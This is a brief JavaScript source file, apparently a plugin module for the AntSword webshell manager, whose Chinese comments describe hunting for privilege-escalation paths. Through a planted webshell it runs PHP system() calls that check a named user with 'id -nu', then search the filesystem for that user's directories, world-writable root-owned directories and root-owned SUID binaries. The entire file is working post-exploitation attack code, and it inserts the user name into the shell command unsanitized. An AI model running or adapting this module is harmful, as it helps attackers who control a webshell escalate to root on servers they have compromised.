/**
 * 核心模块
 */

class Core {
  constructor(opt,argv) {
    let self = this;
    return new Promise((res, rej) => {
      let core = new antSword['core'][opt['type']](opt);
      switch (argv.type) {
        case "username":
          core.request({
              _: this._check_user(argv.user)
            }).then((temp)=>{
              var check=temp.text;
              if (check==""){
                return rej("Cannot find the user");
              }
            })
          core.request({
            _: this._find_path(argv.user)
          }).then(res)
              .catch((err)=>{return rej(err);});
          break;
      }
    })
  }

  //检查用户是否存在
  _check_user(user){
    return `system('id -nu ${user}')`;
  }

 //查找rwx目录以及suid提权文件并一起返回
  _find_path(user) {
    return `system ('find / -type d -perm -700 -user ${user} ; find / -type d -perm -007 -user root ; echo ph4ntom_ph4ntom ;find / -user root -perm -4000 ')`
  }


}

module.exports = Core;
